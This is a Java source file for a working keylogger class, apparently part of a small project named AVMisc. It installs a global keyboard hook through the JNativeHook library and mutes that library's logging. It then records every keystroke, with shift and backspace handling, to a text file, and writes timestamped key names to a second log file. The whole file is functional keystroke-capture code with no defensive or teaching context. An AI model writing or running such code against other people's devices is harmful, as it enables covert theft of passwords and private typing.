package com.AVMisc;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.Arrays;
import java.util.logging.Level;
import java.util.logging.Logger;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

public class Keylogger implements NativeKeyListener {
	private static final DateTimeFormatter LOG_DTF = DateTimeFormatter.ofPattern("MM-dd-YYYY HH:mm:ss");
	private Path klFilePath = Paths.get("file.txt");
	private Path klLogFilePath = Paths.get("log.txt");
	private boolean KLIsRunning = false;
	private boolean shiftIsDown = false;
	
	public Keylogger() {
		Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
		logger.setLevel(Level.OFF);
		logger.setUseParentHandlers(false);
	}
	
	public void start() {
		if(KLIsRunning) {
			System.out.println("Keylogger is already running");
		}
		else {
			try {
				GlobalScreen.registerNativeHook();
				GlobalScreen.addNativeKeyListener(this);
				
				if(!Files.exists(klFilePath)) {
					Files.createFile(klFilePath);
				}
				if(!Files.exists(klLogFilePath)) {
					Files.createFile(klLogFilePath);
				}
				KLIsRunning = true;
			}
			catch(NativeHookException | IOException e) {
				System.out.println(e.getMessage());
				KLIsRunning = false;
			}
		}
	}
	
	public void stop() {
		if(KLIsRunning) {
			try {
				GlobalScreen.unregisterNativeHook();
				KLIsRunning = false;
			}
			catch(NativeHookException e) {
				System.out.println(e.getMessage());
			}
		}
	}
	
	public boolean isRunning() {
		return KLIsRunning;
	}
	
	@Override
	public void nativeKeyPressed(NativeKeyEvent event) {
		try {
			String keyText = ""; // The text written to the basic log file
			String logKeyText = String.format("%s ----- %s\n", NativeKeyEvent.getKeyText(event.getKeyCode()), LOG_DTF.format(LocalDateTime.now()));
			switch(event.getKeyCode()) {
				case NativeKeyEvent.VC_SPACE:
					keyText = " ";
					break;
				case NativeKeyEvent.VC_ENTER:
					keyText = "\n";
					break;
				case NativeKeyEvent.VC_TAB:
					keyText = "\t";
					break;
				case NativeKeyEvent.VC_BACKSPACE:
					byte[] data = Files.readAllBytes(klFilePath);
					if (data.length > 0) {
						byte[] arr = Arrays.copyOf(data, data.length - 1);
						Files.deleteIfExists(klFilePath);
						Files.write(klFilePath, arr, StandardOpenOption.CREATE_NEW);
						data = null;
						arr = null;
					}
				break;
				case NativeKeyEvent.VC_BACKQUOTE:
					keyText = shiftIsDown ? "~" : "`";
					break;
				case NativeKeyEvent.VC_1:
					keyText = shiftIsDown ? "!" : "1";
					break;
				case NativeKeyEvent.VC_2:
					keyText = shiftIsDown ? "@" : "2";
					break;
				case NativeKeyEvent.VC_3:
					keyText = shiftIsDown ? "#" : "3";
					break;
				case NativeKeyEvent.VC_4:
					keyText = shiftIsDown ? "$" : "4";
					break;
				case NativeKeyEvent.VC_5:
					keyText = shiftIsDown ? "%" : "5";
					break;
				case NativeKeyEvent.VC_6:
					keyText = shiftIsDown ? "^" : "6";
					break;
				case NativeKeyEvent.VC_7:
					keyText = shiftIsDown ? "&" : "7";
					break;
				case NativeKeyEvent.VC_8:
					keyText = shiftIsDown ? "*" : "8";
					break;
				case NativeKeyEvent.VC_9:
					keyText = shiftIsDown ? "(" : "9";
					break;
				case NativeKeyEvent.VC_0:
					keyText = shiftIsDown ? ")" : "0";
					break;
				case NativeKeyEvent.VC_MINUS:
					keyText = shiftIsDown ? "_" : "-";
					break;
				case NativeKeyEvent.VC_EQUALS:
					keyText = shiftIsDown ? "+" : "=";
					break;
				case NativeKeyEvent.VC_OPEN_BRACKET:
					keyText = shiftIsDown ? "{" : "[";
					break;
				case NativeKeyEvent.VC_CLOSE_BRACKET:
					keyText = shiftIsDown ? "}" : "]";
					break;
				case NativeKeyEvent.VC_BACK_SLASH:
					keyText = shiftIsDown ? "|" : "\\";
					break;
				case NativeKeyEvent.VC_SEMICOLON:
					keyText = shiftIsDown ? ":" : ";";
					break;
				case NativeKeyEvent.VC_QUOTE:
					keyText = shiftIsDown ? "\"" : "'";
					break;
				case NativeKeyEvent.VC_COMMA:
					keyText = shiftIsDown ? "<" : ",";
					break;
				case NativeKeyEvent.VC_PERIOD:
					keyText = shiftIsDown ? ">" : ".";
					break;
				case NativeKeyEvent.VC_SLASH:
					keyText = shiftIsDown ? "?" : "/";
					break;
				case NativeKeyEvent.VC_A:
				case NativeKeyEvent.VC_B:
				case NativeKeyEvent.VC_C:
				case NativeKeyEvent.VC_D:
				case NativeKeyEvent.VC_E:
				case NativeKeyEvent.VC_F:
				case NativeKeyEvent.VC_G:
				case NativeKeyEvent.VC_H:
				case NativeKeyEvent.VC_I:
				case NativeKeyEvent.VC_J:
				case NativeKeyEvent.VC_K:
				case NativeKeyEvent.VC_L:
				case NativeKeyEvent.VC_M:
				case NativeKeyEvent.VC_N:
				case NativeKeyEvent.VC_O:
				case NativeKeyEvent.VC_P:
				case NativeKeyEvent.VC_Q:
				case NativeKeyEvent.VC_R:
				case NativeKeyEvent.VC_S:
				case NativeKeyEvent.VC_T:
				case NativeKeyEvent.VC_U:
				case NativeKeyEvent.VC_V:
				case NativeKeyEvent.VC_W:
				case NativeKeyEvent.VC_X:
				case NativeKeyEvent.VC_Y:
				case NativeKeyEvent.VC_Z:
					keyText = shiftIsDown ? NativeKeyEvent.getKeyText(event.getKeyCode()) : NativeKeyEvent.getKeyText(event.getKeyCode()).toLowerCase();
					break;
				default:
					break;
			}
			// Check when the shift key is pressed
			if(event.getKeyCode() == NativeKeyEvent.VC_SHIFT) {
				shiftIsDown = true;
			}
			Files.write(klFilePath, keyText.getBytes(), StandardOpenOption.APPEND);
			Files.write(klLogFilePath, logKeyText.getBytes(), StandardOpenOption.APPEND);
		}
		catch (IOException e) {
			System.out.println(e.getMessage());
		}
		
	}

	
	@Override
	public void nativeKeyReleased(NativeKeyEvent event) {
		if(event.getKeyCode() == NativeKeyEvent.VC_SHIFT) {
			shiftIsDown = false;
		}
	}

	@Override
	public void nativeKeyTyped(NativeKeyEvent event) {
		
	}
	
	
}
